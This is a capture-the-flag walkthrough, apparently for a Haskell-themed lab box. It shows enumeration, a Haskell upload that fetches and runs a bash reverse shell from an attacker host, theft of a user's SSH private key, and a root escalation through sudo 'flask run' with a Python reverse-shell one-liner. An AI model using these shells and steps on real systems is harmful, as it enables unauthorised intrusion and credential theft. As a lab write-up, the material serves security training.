#### Replace the "ATTACK_IP" and the "ATTACK_PORT" with your own.

### user.txt

After an `nmap` scan, we see that there is a website running on port 5051:
```
┌─[root@edu-virtualbox]─[/home/edu/THM/EXPLOITS/revshells]
└──╼ #nmap -A -p- TARGET_IP
Nmap scan report for TARGET_IP
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
5001/tcp open  http    Gunicorn 19.7.1
|_http-title: Homepage
|_http-server-header: gunicorn/19.7.1
```

The owner of the website is a Haskell professor. In `/homework1`, we find that there is a place to upload and run Haskell files. The link however is broken, and leads to `/uploads`.
```
┌─[root@edu-virtualbox]─[/home/edu/THM]
└──╼ #gobuster dir -u http://10.10.52.226:5001/ -w /usr/share/wordlists/dirb/big.txt -x .hs,.txt,.bak,.html,.txt -q
/submit               (Status: 200) [Size: 237]
```

In the `/submit` directory, we find an endpoint to upload files to. The files will then be compiled and ran, and the output will be displayed.
So we try uploading a `bash` reverse shell
shell.sh:
```
#!/bin/bash
/bin/bash -i >& /dev/tcp/ATTACKER_IP/ATTACK_PORT 0>&1
```
Then we open the listener in the same directory we placed `shell.sh`:
```
python3 -m http.server 80
```

Then, we upload the Haskell file:
```
import System.Process
main = do
	callCommand "wget http://ATTACK_IP/shell.sh"
	callCommand "chmod +x shell.sh"
	callCommand "./shell.sh"
```

This gives a reverse shell to the IP address, as the `flask` user.
The `flask` user also has access to the home directory of the `prof` user, where the `id_rsa` file can be found. (`/home/prof/.ssh/id_rsa`)
We copy this file to the attacker machine.

Using the `id_rsa` from the `prof` user, we log in: 
```
chmod 600 id_rsa
ssh -i id_rsa prof@TARGET_IP
```

### root.txt

Then, we run `sudo -l`:
```
$ sudo -l
Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run
```

`flask run` runs the python script in the environment variable `FLASK_APP`.
This runs as root, so we can create `bad_stuff.py`:
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACK_IP",ATTACK_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

To run the exploit, we use:
```
export FLASK_APP=/tmp/bad_stuff.py //Put a reverse shell in bad_stuff.py
sudo /usr/bin/flask run
```
For root.